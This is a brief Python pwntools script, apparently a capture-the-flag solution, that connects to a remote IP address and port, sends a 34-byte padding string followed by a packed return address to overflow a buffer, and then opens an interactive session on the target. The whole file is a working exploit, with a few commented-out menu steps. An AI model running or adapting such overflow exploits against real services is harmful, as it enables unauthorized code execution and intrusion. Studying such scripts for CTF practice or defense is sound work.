#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
# r.sendline("jiuhao")
# r.recvuntil("choice:>>")
# r.send("1")
# r.recvuntil("we in addr")
r.sendline(b"a" * 34 + p64(0x08048644))
r.interactive()
